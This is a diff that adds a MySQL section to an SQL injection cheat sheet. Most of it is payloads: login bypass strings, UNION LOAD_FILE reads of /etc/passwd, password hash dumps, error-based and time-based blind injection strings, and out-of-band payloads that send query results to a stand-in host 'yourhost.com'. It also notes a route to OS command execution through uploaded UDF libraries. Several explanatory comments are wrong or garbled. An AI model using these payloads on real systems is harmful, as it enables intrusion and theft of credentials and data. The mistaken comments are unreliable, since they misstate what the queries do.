@@ -322,3 +322,209 @@ SELECT name FROM master..syslogins WHERE dbcreator = 1;
 — This command obtains column name ‘name’ from table master..syslogins having dbcreator value as 1.
 SELECT name FROM master..syslogins WHERE bulkadmin = 1;
 — This command obtains column name ‘name’ from table master..syslogins having bulkadmin value as 1.
+
+MYSQL
+
+Query Command
+Version - SELECT @@VERSION;
+— This command retrieves the system information of the
+
+current installation of SQL Server.
+SELECT version();
+— This command selects the specific version of a Server.
+
+List Users
+SELECT user FROM mysql.user;
+— This command lists the column ‘user’ from the table ‘mysql.user’.
+
+Current User
+SELECT user();
+— This command obtains the current MySQL user name and hostname.
+SELECT system_user();
+— This command obtains the current value of system_user.
+
+List all Database
+
+SELECT schema_name FROM information_schema.schemata; 
+- for MySQL >= v5.0
+—This command obtains a column name ‘schema_name’ having a list of databases from the table ‘schemata table’.
+
+SELECT distinct(db) FROM mysql.db; 
+— priv
+
+Current Database
+SELECT database();
+— This command obtains the current MySQL database.
+
+List Tables
+SELECT table_name FROM information_schema.tables WHERE table_schema = 'tblUsers'
+— This command obtains the column name ‘table_name’ from the table ‘information_schema.tables’ having table_schema value ‘tblUsers’. tblUsers -> tablename
+
+Column Names
+SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'tblUsers’
+— This command obtains the columns name ‘table_name’ and ‘column_name’ from the table ‘information_schema.tables’ having table_schema value ‘tblUsers’. tblUsers -> tablename
+
+SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = 'username';
+— This command obtains the columns name ‘table_name’ and ‘column_name’ from the table ‘information_schema.tables’ having table_schema value ‘username’.
+
+Select Nth Row
+SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0;
+— This command returns rows numbered from 0.
+
+SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1;
+— This command returns rows numbered from 0.
+
+Select Nth Char
+SELECT substr(‘abcd’, 3, 1);
+— This command returns c.
+
+If Statement 
+SELECT if(1=1,’foo’,'bar’); 
+— returns ‘foo’
+
+Case Statement
+SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END;
+— This command returns A.
+
+Comments
+SELECT 1; #comment
+— This command is used for writing a comment.
+
+SELECT /*comment*/1;
+— This command is used comment out a statement.
+
+String without Quotes
+SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))
+— This command returns ‘KLM’.
+
+Time Delay
+SELECT BENCHMARK(1000000,MD5(‘A’));
+SELECT SLEEP(5); -- >= 5.0.12
+— This command triggers a measurable time delay.
+
+Command Execution
+If mysqld (<5.0) is running as root AND you compromise a DBA
+account you can execute OS commands by uploading a shared
+object file into /usr/lib (or similar). The .so file should contain a
+User Defined Function (UDF). raptor_udf.c explains exactly how
+you go about this. Remember to compile for the target
+architecture which may or may not be the same as your attack
+platform.
+
+Make DNS Requests 
+N/A
+
+Load File
+' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
+SELECT LOAD_FILE(0x633A5C626F6F742E696E69)
+— This command will show the content of c:\boot.ini.
+
+log in as admin user
+DROP sampletable;--
+DROP sampletable;#
+Username : admin'--
+ : admin' or '1'='1'--
+SELECT * FROM members WHERE $username = 'admin'--' AND $password = 'password'
+— This command lists all the users from the column ‘members’ having $username value as ‘admin’ and $password value as ‘password’.
+
+List Passwords
+SELECT user, password FROM mysql.user;
+— This command retrieves the columns ‘user’ and ‘password‘ from the table ‘mysql.user’.
+
+SELECT user, password FROM mysql.user LIMIT 1,1;
+— This command retrieves the columns ‘user’ and ‘password‘ from the table ‘mysql.user’ with LIMIT 1,1.
+
+SELECT password FROM mysql.user WHERE user = 'root';
+— This command retrieves the column ‘password‘ from the table ‘mysql.user’ having user value as ‘root’.
+
+List Password Hashes
+SELECT host, user, password FROM mysql.user;
+— This command lists columns ‘host’, ‘user’ and ‘password’ from the table ‘mysql.user’.
+
+Bulk Insert
+SELECT * FROM mytable INTO dumpfile '/tmp/somefile';
+— This command is used to insert a file content to a table.
+
+Create Users
+CREATE USER username IDENTIFIED BY 'password';
+— This command creates a username ‘USER’ who authenticates by password to log on to the database.
+
+Drop User
+DROP USER username;
+— This command drops a username ‘USER’ from the table.
+
+Make User DBA
+GRANT ALL PRIVILEGES ON *.* TO username@'%';
+— This command grants DBA privileges to a user.
+
+Local File Access
+…’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’)
+— This command allows you to only read world-readable files.
+
+SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’;
+— This command allows you to write to file system.
+
+Hostname, IP Address
+SELECT @@hostname;
+— This command obtains the Hostname and IP address of a system
+
+Error Based SQLi attack: To throw conversion errors.
+
+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1));
+— This command is used to receive integer inputs.
+
+'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+';
+— This command is used to receive string inputs.
+
+Clear SQLi Tests: For Boolean SQL injection and silent attacks
+product.php?id=4
+product.php?id=5-1
+product.php?id=4 OR 1=1
+product.php?id=-1 OR 17-7=10
+— These commands can be used to test for Boolean SQL
+
+injection and silent attacks. Blind SQL Injection (Time Based)
+SLEEP(25)--
+SELECT BENCHMARK(1000000,MD5('A'));
+ProductID=1 OR SLEEP(25)=0 LIMIT 1—
+ProductID=1) OR SLEEP(25)=0 LIMIT 1--
+ProductID=1' OR SLEEP(25)=0 LIMIT 1—
+ProductID=1') OR SLEEP(25)=0 LIMIT 1--
+ProductID=1)) OR SLEEP(25)=0 LIMIT 1—
+ProductID=SELECT SLEEP(25)—
+— These commands trigger a measurable time delay.
+
+Time base SQLi exploitation
+?vulnerableParam=-99 OR IF((ASCII(MID(({INJECTON}),1,1)) = 100),SLEEP(14),1) = 0 LIMIT 1— 
+{INJECTION} = You want to run the query.
+— If the condition is true, will response after 14 seconds. If is false, will be delayed for one second.
+
+Out of Band Channel
+?vulnerableParam=-99 OR (SELECT LOAD_FILE(concat('\\\\',({INJECTION}), 'yourhost.com\\')));
+— This command makes a NBNS query request/DNS resolution request to yourhost.com.
+?vulnerableParam=-99 OR (SELECT ({INJECTION}) INTO OUTFILE '\\\\yourhost.com\\share\\output.txt');
+— This command writes data to your shared folder/file. {INJECTION} = You want to run the query.
+
+Default Databases
+information_schema (>= mysql 5.0)
+mysql
+
+Path of DB files
+SELECT @@datadir C:\AppServ\MySQL\data\
+
+Location of DB Files
+SELECT @@datadir;
+— This command obtains the location of DB files.
+
+privileges
+SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;
+— This command lists list user privileges.
+
+SELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user;
+— This command lists list various types of privileges.
+
+list user privsSELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges;
+— This command lists privileges on databases (schemas).
+
+SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;
+— This command lists privileges on columns.
